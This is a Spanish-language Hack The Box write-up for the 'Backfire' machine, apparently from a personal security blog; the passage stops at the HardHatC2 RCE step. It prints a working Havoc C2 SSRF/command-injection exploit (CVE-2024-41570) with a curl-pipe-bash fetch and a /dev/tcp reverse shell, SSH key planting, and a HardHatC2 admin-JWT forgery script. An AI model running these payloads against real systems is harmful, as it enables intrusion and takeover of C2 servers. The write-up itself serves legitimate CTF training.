---
title: Backfire - Medium (HTB)
permalink: /Backfire-HTB-Writeup/
tags: 
 - "Linux"
 - "Medium"
 - "Information Leakage"
 - "Havoc C2"
 - "SSRF"
 - "CVE-2024-41570"
 - "Authorized Keys"
 - "Local Port Forwarding"
 - "SSH"
 - "HardHatC2 Abuse"
 - "Auth Bypass"
 - "Iptables"
 - "Sudoers"
categories:
  - writeup
  - hacking
  - hackthebox
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Backfire - Medium (HTB)
seo_description: Explota servicios de Command and Control y configura reglas de firewall para ganar acceso privilegiado y vencer Backfire.
excerpt: Explota servicios de Command and Control y configura reglas de firewall para ganar acceso privilegiado y vencer Backfire.
header:
  overlay_image: /assets/images/headers/backfire-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/backfire-hackthebox.jpg
---


![image-center](/assets/images/posts/backfire-hackthebox.png)
{: .align-center}

**Habilidades:** Information Leakage, Havoc C2 Server Side Request Forgery (CVE-2024-41570), Abusing SSH Key Based Authentication, SSH Local Port Forwarding, HardHatC2 Exploitation - Auth Bypass + RCE, Abusing `iptables` Sudoers Privileges [Privilege Escalation] 
{: .notice--primary}

# Introducción

 Backfire es una máquina Linux de dificultad `Medium` en HackTheBox que requiere explotación de servicios de `Commnand and Control` (C2) para ejecutar comandos en el servidor y ganar acceso inicial. Abusaremos de permisos `sudo` para escalar privilegios y convertirnos en `root` dentro de Backfire.
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping 10.10.11.49 -c1  
PING 10.10.11.49 (10.10.11.49) 56(84) bytes of data.
64 bytes from 10.10.11.49: icmp_seq=1 ttl=63 time=208 ms

--- 10.10.11.49 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 208.410/208.410/208.410/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo a los puertos de la máquina con el fin de identificar puertos abiertos usando el protocolo TCP, si no encontráramos gran cosa, intentaríamos escanear otros protocolos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.49 -oG openPorts                                                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 13:24 EDT
Nmap scan report for 10.10.11.49
Host is up (0.20s latency).
Not shown: 54556 closed tcp ports (reset), 10974 filtered tcp ports (no-response), 2 filtered tcp ports (port-unreach)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo dirigido a los puertos abiertos identificados, el propósito será descubrir versiones además de realizar un pequeño reconocimiento a los servicios expuestos

~~~ bash
nmap -p 22,443,8000 -sVC 10.10.11.49 -oN services                                                                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 13:25 EDT
Nmap scan report for 10.10.11.49
Host is up (0.21s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open  ssl/http nginx 1.22.1
|_http-server-header: nginx/1.22.1
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=tech llc/stateOrProvinceName=Colorado/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Not valid before: 2025-05-11T10:01:23
|_Not valid after:  2028-05-10T10:01:23
|_http-title: 404 Not Found
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
8000/tcp open  http     nginx 1.22.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.22.1
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 12:31  disable_tls.patch
| 875   17-Dec-2024 12:34  havoc.yaotl
|_
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.84 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Logramos identificar el puerto `22` (SSH), `443` (HTTPS), donde existe una web que visitaremos luego, además de un servicio HTTP en el puerto `8000`


## Web Analysis

Intentaremos identificar las tecnologías web que se ejecuten en cada servicio HTTP y HTTPS que descubrimos

### Port `443` (HTTPS)

Comenzaremos con el puerto `443`

~~~ bash
whatweb https://10.10.11.49                                                                                           
https://10.10.11.49 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[10.10.11.49], Title[404 Not Found], UncommonHeaders[x-havoc], nginx[1.22.1]
~~~

Vemos que el servidor ejecuta `nginx 1.22.1`. Si visitamos la web veremos el siguiente mensaje donde no se nos muestra un contenido, esto puede deberse a que no existe un archivo `index`, por lo que no nos cargará nada por ahora

![image-center](/assets/images/posts/backfire-port-443.png)
{: .align-center}

### Port `8000` (HTTP)

Haremos un segundo escaneo al puerto `8000`, donde parece haber `Directory Listing`, podemos darnos cuenta gracias al título `Index of /`, común en este tipo de escenarios

~~~ bash
whatweb http://10.10.11.49:8000
http://10.10.11.49:8000 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[10.10.11.49], Index-Of, Title[Index of /], nginx[1.22.1]
~~~

Si navegamos hasta este servicio veremos que efectivamente se está listando el contenido del directorio donde se ejecuta este servicio web. Veremos dos archivos, uno con extensión `.patch` y uno con extensión `.yaoctl`

![image-center](/assets/images/posts/backfire-port-8000.png)
{: .align-center}

> Un archivo .patch (o a veces .diff) es un archivo de texto que **representa las diferencias entre dos versiones de un archivo o conjunto de archivos**
{: .notice--info}

En cuanto al archivo `yaotl`, buscando en Google podemos darnos cuenta que pertenece a un archivo de configuración del framework `Havoc C2`

> El framework `Command and Control` (C2) Havoc es un marco flexible de **post-explotación** escrito en Golang
{: .notice--info}

Podemos directamente hacer clic para descargar estos archivos o hacerlo desde consola con `wget`


## Files Analysis

Si analizamos el contenido del archivo `disable_tls.patch` notaremos que deshabilita TLS/SSL para el puerto de gestión (`40056`) para comprobar que el usuario `sergej` no está trabajando

~~~ bash
cat disable_tls.patch 

Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
 		}
 
 		// start the teamserver
-		if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+		if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
 			logger.Error("Failed to start websocket: " + err.Error())
 		}
~~~

Analizando el archivo `.yaotl`, veremos la configuración de `Havoc`, incluyendo parámetros de configuración, credenciales de acceso, agentes y listeners

~~~ bash
cat havoc.yaotl      

Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
~~~

Al intentar conectarnos por `ssh` el servidor mostrará el siguiente mensaje, donde se nos deniega el acceso debido a que el servidor está rechazando nuestra clave pública para la autenticación

~~~ bash
ssh sergej@backfire.htb
sergej@backfire.htb: Permission denied (publickey).
~~~
<br>


# Intrusión / Explotación
---
## Havoc C2 Server Side Request Forgery (CVE-2024-41570)

Esta es una vulnerabilidad crítica de tipo Server Side Request Forgery en `Havoc 2.0.7`. Se acontece cuando el `Teamserver` procesa solicitudes de `callback` de agentes `demon` sin autenticación previa.

Un atacante puede enviar solicitudes maliciosas con el propósito de que el `Teamserver` **interprete comandos** en el servidor. Aprovecharemos este fallo de seguridad para que el servidor envíe solicitudes HTTP a nuestra máquina atacante y ejecute un payload que nos otorgue acceso

### Setting up

Utilizaremos una versión modificada del exploit original debido a que ya se encuentra casi configurado. Clonaremos el repositorio e instalaremos las dependencias necesarias para que el exploit se ejecute correctamente

~~~ bash
git clone https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE
cd CVE-2024-41570-Havoc-C2-RCE 
pip install -r requirements.txt
~~~

Modificaremos el script `payload.sh` para que la shell que contiene dentro, apunte a nuestro listener

> `payload.sh`

~~~ bash
bash -i /dev/tcp/10.10.14.99/4444 0>&1 # Reemplaza por tu IP de HTB
~~~

Modificaremos el exploit para agregar el siguiente contenido después de la línea `211` (`open_socket`)

~~~ python
...
...
USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"
host = "127.0.0.1"
port = 40056

websocket_request = create_websocket_request(host, port)
print("[+] Writing socket...")
write_socket(socket_id, websocket_request)
response = read_socket(socket_id)


payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)

payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)

cmd = "curl http://10.10.14.99/payload.sh | bash" # Agrega tu IP de HTB
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
"Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)
~~~

### Understanding SSRF

Primero estamos estableciendo una conexión a través de una conexión `WebSocket` con el C2 utilizando las credenciales que obtuvimos

~~~ python
USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"
host = "127.0.0.1"
port = 40056

websocket_request = create_websocket_request(host, port)
print("[+] Writing socket...")
write_socket(socket_id, websocket_request)
response = read_socket(socket_id)
~~~

Luego nos autenticamos con el siguiente JSON, donde enviamos la contraseña en formato hash

~~~ json
payload = {
    "Body": {
        "Info": {
            "Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(),  # Hash SHA3-256
            "User": USER
        },
        "SubEvent": 3
    },
    "Head": {
        "Event": 1,
        "OneTime": "",
        "Time": "18:40:17",
        "User": USER
    }
}
~~~

Lo siguiente que hace el script es configurar un listener malicioso en el C2 para redirigir tráfico

~~~ python
payload = {
    "Body": {
        "Info": {
            "Headers": "",
            "HostBind": "0.0.0.0",  # Escucha en todas las interfaces
            "HostHeader": "",
            "HostRotation": "round-robin",
            "Hosts": "0.0.0.0",
            "Name": "abc",
            "PortBind": "443",  # Puerto de escucha (HTTPS)
            "PortConn": "443",
            "Protocol": "Https",
            "Proxy Enabled": "false",
            "Secure": "true",
            "Status": "online",
            "Uris": "",
            "UserAgent": "Mozilla/5.0 (Windows NT 6.1; WOW64)..."
        },
        "SubEvent": 1
    },
    "Head": {
        "Event": 2,
        "OneTime": "",
        "Time": "08:39:18",
        "User": USER
    }
}
~~~

La inyección se acontece cuando enviamos una solicitud para que el C2 ejecute un comando a través del campo `ServiceName`, que en vez de ejecutar un servicio legítimo ejecutará nuestro servicio que en realidad es un comando.

>Nota cómo en la variable `injection` se muestran caracteres que rompen la sintaxis esperada
{: .notice--info}

~~~ bash
cmd = "curl http://10.10.14.99/payload.sh | bash"  # Descarga y ejecuta un payload
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
payload = {
    "Body": {
        "Info": {
            "AgentType": "Demon",
            "Arch": "x64",
            "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    ...\n    \"Service Name\":\"" + injection + "\",\n    ...\n}\n",
            "Format": "Windows Service Exe",
            "Listener": "abc"
        },
        "SubEvent": 2
    },
    "Head": {
        "Event": 5,
        "OneTime": "true",
        "Time": "18:39:04",
        "User": USER
    }
}
~~~

Entonces el servidor ejecutará una solitud a un recurso `payload.sh` ubicado en nuestra máquina

### Exploiting

Iniciaremos un servidor HTTP para que la máquina víctima pueda acceder al recurso `payload.sh`

~~~ bash
python3 -m http.server 80                                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Iniciaremos nuestro listener, que estará a la espera para recibir la shell por el puerto que definimos en el script `payload.sh`

~~~ bash
nc -lvnp 4444
listening on [any] 4444 ...
~~~

Lanzaremos el exploit para abrir un `websocket`

~~~ bash
python3 exploit.py --target https://backfire.htb -i 127.0.0.1 -p 40056
[+] Registering agent... 
[+] Opening socket...
[+] Writing socket...
~~~

En nuestro servidor HTTP deberíamos ver una solicitud a `payload.sh`

~~~ bash
10.10.11.49 - - [06/Jun/2025 13:33:20] "GET /payload.sh HTTP/1.1" 200 -
~~~


## (Failed) Shell as `ilya`

En nuestro listener deberíamos recibir la conexión como el usuario `ilya`

~~~ bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.99] from (UNKNOWN) [10.10.11.49] 39046
bash: cannot set terminal process group (12039): Inappropriate ioctl for device
bash: no job control in this shell
ilya@backfire:~/Havoc/payloads/Demon$
~~~

Al cabo de unos momentos, nuestra shell se irá pal carajo porque el servidor termina nuestra shell

~~~
ilya@backfire:~/Havoc/payloads/Demon$ export TERM
                                                 Session terminated, killing shell... ...killed.
                                                                                                Script done.
~~~


## SSH Key Based Authentication

Generaremos un nuevo par de claves `ssh` que utilizaremos para conectarnos a la máquina víctima

~~~ bash
ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:Tu7T8f5Jo1S9XtueQjtuj9imVfshNF6khK75WNORMLs root@parrot
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|            .    |
|           + . . |
|          . = +. |
|        S  o *.o.|
|       +  + =o= o|
|        o+ Eo=++.|
|       .. =.*O+oB|
|        .o =B=**+|
+----[SHA256]-----+
~~~

Estableceremos una nueva shell donde agregaremos nuestra clave pública SSH al archivo `authorized_keys` ubicado en el directorio `.ssh` del usuario `ilya`.

Primeramente copiaremos la clave pública que acabamos de generar

~~~ bash
cat ~/.ssh/id_rsa.pub | xclip -sel clip
~~~

Ahora dentro de la máquina antes de que se nos cierre la conexión, guardamos nuestra clave en el archivo `authorized_keys` dentro del directorio `.ssh` del usuario `ilya`

~~~ bash
ilya@backfire:~/Havoc/payloads/Demon$ echo -n 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4VTWaxpy5Wx6rXfjyhboP5DeQdjM5ZSwYLZLHZMsf6xIukBMp2LlXOIIB4sq4nIK9CgzQA384ddlxCyvMXU3YnuxvhIWMna+xlOpVQdRF5pfrviWcAApm6n5io8pTNum0Jj1RjeQ7br2zN/gsQEK1UTzVD/fYc6yUybyqJWzsl7gxzFo/QARia+YzxyEHcz8qOqpoFHdWaNypyE68nNoJ+yO3LLxoLVJJXxxjKXR/f8bE5jv4vJwHkqclXynDTfFsbeprnC0dGzzf1waE16dpp6EiOocJ3E0/w8pJM1nxj63LJGLOjo4qiWqnxdFjzbKgiYeo3Gf71wEKLf/zg8fp84n9kvn++UXGBEcUuJJSO+2KmrSNz03A2pLsdsxsUYEtwX51RmPbPb1EwAF4rk8idz0hVwe5lQZiZ2oRILCx2r5i0eABVrA8fUCSKGTsBhwQ4TINUwO2EztpzmAPzGb4/9pYrc5TrdXwiSjH9qBEbzk5cfquu7ZGObiA86jbRZc= root@parrot' >> ~/.ssh/authorized_keys  
<ObiA86jbRZc= root@parrot' >> ~/.ssh/authorized_keys
~~~


## Shell as `ilya`

Ahora podremos conectarnos a través de `ssh` sin proporcionar contraseña

~~~ bash
ssh ilya@backfire.htb 
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
ilya@backfire:~$ export TERM=xterm
~~~

En este punto ya podremos ver la flag del usuario sin privilegios

~~~ bash
ilya@backfire:~$ cat user.txt 
eb7...
~~~
<br>


# Escalada de Privilegios
---
## System Enumeration

Haremos una enumeración básica del sistema para identificar un vector de escalada de privilegios. Comenzaremos viendo los usuarios de la máquina

~~~ bash
ilya@backfire:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ilya:x:1000:1000:ilya,,,:/home/ilya:/bin/bash
sergej:x:1001:1001:,,,:/home/sergej:/bin/bash
~~~

Solo existen los usuarios `sergej` e `ilya` además de `root`

### (Failed) Sudoers

La supuesta contraseña que teníamos para el usuario `ilya` desde el archivo `.yaotl`, no se reutiliza a nivel de sistema

~~~ bash
ilya@backfire:~$ sudo -l
[sudo] password for ilya: 
Sorry, try again.
~~~

### (Failed) SUID Binaries

Si buscamos binarios que sean `suid`, no encontraremos grandes resultados

~~~ bash
ilya@backfire:~$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/su
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
~~~

### Files

Lo que deberíamos haber hecho en un principio es listar los archivos del directorio actual, veremos que existe un archivo `hardhat.txt`, además de los directorios `files` y `Havoc`

~~~ bash
ilya@backfire:~$ ls -la
total 40
drwx------  5 ilya ilya 4096 Dec 12 10:14 .
drwxr-xr-x  4 root root 4096 Sep 28  2024 ..
lrwxrwxrwx  1 root root    9 Dec 12 10:14 .bash_history -> /dev/null
-rw-r--r--  1 ilya ilya  220 Sep 27  2024 .bash_logout
-rw-r--r--  1 ilya ilya 3526 Sep 27  2024 .bashrc
drwxr-xr-x  2 root root 4096 Sep 30  2024 files
-rw-r--r--  1 root root  174 Sep 28  2024 hardhat.txt
drwxr-xr-x 10 ilya ilya 4096 Sep 27  2024 Havoc
-rw-r--r--  1 ilya ilya  807 Sep 27  2024 .profile
drwxr-xr-x  2 ilya ilya 4096 Dec 12 10:01 .ssh
-rw-r-----  1 root ilya   33 Jun  6 14:08 user.txt
~~~

Veremos el siguiente mensaje en el archivo `hardhat.txt`, donde se dice que `sergej` ha instalado `HardHatC2` para realizar pruebas y que ha dejado todo por defecto, por dios este hombre JAJAJA

~~~ bash
ilya@backfire:~$ cat hardhat.txt 
Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C#
~~~

### Internally Open Ports

Listaremos puertos abiertos internamente, o sea, que solo son accesibles desde la máquina víctima

~~~ bash
ilya@backfire:~$ ss -tunl | grep LISTEN
tcp   LISTEN 0      512          0.0.0.0:5000       0.0.0.0:*          
tcp   LISTEN 0      512          0.0.0.0:7096       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:40056      0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:443        0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:8000       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8443       0.0.0.0:*          
tcp   LISTEN 0      128             [::]:22            [::]:*
~~~

Notaremos que los puertos `5000` y `7096` que se supone que están abiertos para cualquier dirección IP, sin embargo parece ser que están bloqueados a nivel de `firewall`. Si buscamos procesos asociados a el servicio `HardHatC2`, veremos que `sergej` está ejecutando este servicio

~~~ bash
ilya@backfire:~$ ps -faux | grep HardHatC2
ilya        2817  0.0  0.0   6332  2044 pts/0    S+   14:49   0:00              \_ grep HardHatC2
sergej      2458  1.1  6.6 274254584 262828 ?    Ssl  14:40   0:06 /home/sergej/.dotnet/dotnet run --project HardHatC2Client --configuration Release
sergej      2536  0.6  3.3 274194968 131416 ?    Sl   14:40   0:03  \_ /home/sergej/HardHatC2/HardHatC2Client/bin/Release/net7.0/HardHatC2Client
sergej      2516  0.6  3.2 274212532 130556 ?    Sl   14:40   0:03  \_ /home/sergej/HardHatC2/TeamServer/bin/Release/net7.0/TeamServer
~~~


## SSH Local Port Forwarding

Haremos un reenvío de los puertos `5000` y `7096` para que sean accesibles desde nuestra máquina atacante

~~~ bash
ssh ilya@backfire.htb -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Jun 6 14:40:13 2025 from 10.10.14.99
ilya@backfire:~$ 
~~~

Ahora accederemos a `https://127.0.0.1:7096/` desde nuestro navegador, deberíamos ver el panel de inicio de sesión

![image-center](/assets/images/posts/backfire-hardhatc2.png)
{: .align-center}


## HardHatC2 Exploitation

> HardHatC2 es un framework colaborativo de `Command an Control` (C2) multiplataforma.
> Una investigación de seguridad reveló varias vulnerabilidades críticas que permiten a atacantes no autenticados escribir archivos arbitrarios, eludir la autenticación, y potencialmente lograr la ejecución remota de código.
{: .notice--info}

Más información y detalles en el artículo [HardHatC2 0-Days](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7)

### Authentication Bypass

Utilizaremos el siguiente exploit basado en la siguiente [publicación](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7), donde cambiaremos la variable `rhost` para dirigir el ataque a `127.0.0.1`

~~~ python
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests

rhost = '127.0.0.1:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "sth_pentest",
  "role": "TeamLead",
  "username": "sth_pentest"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
~~~

Antes de ejecutar el script, instalaremos la siguiente dependencia

~~~ bash
pip install PyJWT
~~~

Finalmente ejecutaremos el exploit para crear un usuario, que en este caso se llamará `sth_pentest`

~~~ bash
python3 exploit.py
Generated JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIYXJkSGF0X0FkbWluIiwianRpIjoiZTI3NGM4ZDItZjI1Yi00Y2U1LWFjZmYtNmRhYjQ5NmZiMDBkIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZWlkZW50aWZpZXIiOiIxIiwiaXNzIjoiaGFyZGhhdGMyLmNvbSIsImF1ZCI6ImhhcmRoYXRjMi5jb20iLCJpYXQiOjE3NDkyNTM0MTksImV4cCI6MTc1MTY3MjYxOSwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiQWRtaW5pc3RyYXRvciJ9.oxOFV9qMNOzHU6RWepALEkNgub8ebYPjoO2exF38Vj0
/root/.pyenv/versions/3.11.11/lib/python3.11/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
User sth_pentest created
~~~

> Si el usuario no se crea, prueba cambiando las credenciales en el script para crearlo con otro nombre y contraseña
{: .notice--danger}

Se ha creado el usuario correctamente, volveremos al `login` e iniciamos sesión con las credenciales `sth_pentest:sth_pentest`

![image-center](/assets/images/posts/backfire-hardhatc2-login.png)
{: .align-center}

### Remote Code Execution
 
Para ejecutar comandos el el servidor, haremos clic en el gran botón que dice `Interact`, se nos redirigirá a `https://localhost:7096/ImplantInteract`. 

Crearemos una nueva sesión en una terminal haciendo clic en el ícono `+` de la derecha, en la parte inferior en `Command` enviaremos nuestra clave pública para poder conectarnos por `ssh` como `sergej`

~~~ bash
